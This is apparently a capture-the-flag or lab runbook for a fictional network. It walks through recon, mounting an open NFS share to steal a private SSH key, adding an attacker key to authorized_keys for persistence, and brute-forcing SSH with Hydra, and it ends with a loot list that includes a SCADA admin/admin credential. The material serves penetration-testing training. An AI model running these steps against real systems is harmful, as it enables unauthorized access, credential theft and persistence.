# Runbook: unseen-gate

## Starting state

Someone seems to have been here before. He/she left notes. See `~/README`. Apparently another student who was learning 
"adversarial moves". There is a loot directory with a file `~/loot/prior-recon.txt`.

```bash
cat ~/README
cat ~/loot/prior-recon.txt
```

The prior-recon file shows `wizzards-retreat` at `10.10.0.10` with three ports noted:
22, 111, and 2049.

## Orientation

```bash
id
hostname
ip addr
ip route
ss -tulpn
sudo -l
ls -la ~
cat ~/.bash_history
```

`ip addr` shows a single NIC at `10.10.0.5`. `ip route` shows one attached route to
`10.10.0.0/24` and a default via `10.10.0.200`. That appears to be all that is directly
reachable from here.

`ss -tulpn` shows SSH on port 22 and rpcbind on 111. The rpcbind daemon is running to
support NFSv3 client mounts.

`sudo -l` returns passwordless `mount` and `umount`. That could be useful if the NFS
service listed in the prior-recon turns out to be worth exploring.

`~/.bash_history` has the archaeology from whoever was here before: nmap, a showmount,
an SSH attempt to `rincewind@10.10.0.10`, and a mount of the NFS share. The prior-recon
file appears to be the cleaned-up result of that activity. Not everything they tried seems
to have worked.

## Network recon

```bash
nmap -sV 10.10.0.10
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-22 18:49 UTC
Nmap scan report for 10.10.0.10
Host is up (0.000067s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp   open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.29 seconds
```

```bash
showmount -e 10.10.0.10
```

```
Export list for 10.10.0.10:
/work *
```

Exported to `*`. No client restriction visible. Anyone on the segment can apparently mount it.

## Compromise wizzards-retreat

Two independent paths.

### NFS credential theft

Accounts on unseen-gate have passwordless sudo for `mount` and `umount`; no privilege
escalation required.

```bash
mkdir -p /tmp/nfs
sudo mount -t nfs -o vers=3 10.10.0.10:/work /tmp/nfs
find /tmp/nfs -maxdepth 2 -type f
cat /tmp/nfs/notes.txt
```

Two files. A notes file listing what look like internal addresses, some URLs, and a VPN
reminder. And a private SSH key: `rincewind_id_ed25519`. If it is still authorised on the
remote host, it likely opens a session without the password.

```bash
cp /tmp/nfs/rincewind_id_ed25519 ~/.ssh/
chmod 600 ~/.ssh/rincewind_id_ed25519
ssh -i ~/.ssh/rincewind_id_ed25519 rincewind@10.10.0.10
```

No password prompt.

Once in, add an attacker-controlled public key to rincewind's `authorized_keys` for
persistent access that survives key rotation:

```bash
ssh -i ~/.ssh/rincewind_id_ed25519 rincewind@10.10.0.10 \
    "echo '$(cat ~/.ssh/authorized_keys | head -1)' >> ~/.ssh/authorized_keys"
```

### SSH password brute force

bash_history shows a prior SSH attempt to `rincewind@10.10.0.10`, giving the account name. The wordlist is already on the machine.

```bash
hydra -l rincewind -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.10
```

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-22 18:52:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:1/p:28), ~2 tries per task
[DATA] attacking ssh://10.10.0.10:22/
[22][ssh] host: 10.10.0.10   login: rincewind   password: wizzard
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-22 18:52:35
```

Hydra works through the list and returns a hit.

```bash
ssh rincewind@10.10.0.10
```

The password turns out to be `wizzard`.

## What you can know now

Access:
- SSH to wizzards-retreat as `rincewind` at 10.10.0.10 (key and password both work)

From notes.txt (NFS mount):
- Engineering workstation: 10.10.2.30
- Historian web: 10.10.2.10:8080
- SCADA web: 10.10.2.20:8080, credential admin/admin
- Legacy system: 10.10.1.10, FTP anonymous and SMB open
- DMZ gateway: sorting-office (old gateway password not yet known)

Credentials:
- rincewind / wizzard (SSH password, wizzards-retreat)
